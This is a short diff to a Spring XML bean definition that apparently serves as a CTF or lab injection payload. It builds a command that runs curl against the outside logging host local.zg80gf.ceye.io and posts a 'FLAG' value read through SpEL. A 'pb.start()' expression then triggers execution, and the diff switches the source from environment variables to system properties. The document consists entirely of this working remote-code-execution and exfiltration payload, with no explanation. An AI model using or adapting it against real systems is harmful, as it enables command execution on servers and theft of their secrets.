@@ -10,7 +10,7 @@
           <value>curl</value>
           <value>local.zg80gf.ceye.io</value>
           <value>-d</value>
-          <value>flag=#{ systemEnvironment['FLAG'] }</value>
+          <value>flag=#{ systemProperties['FLAG'] }</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
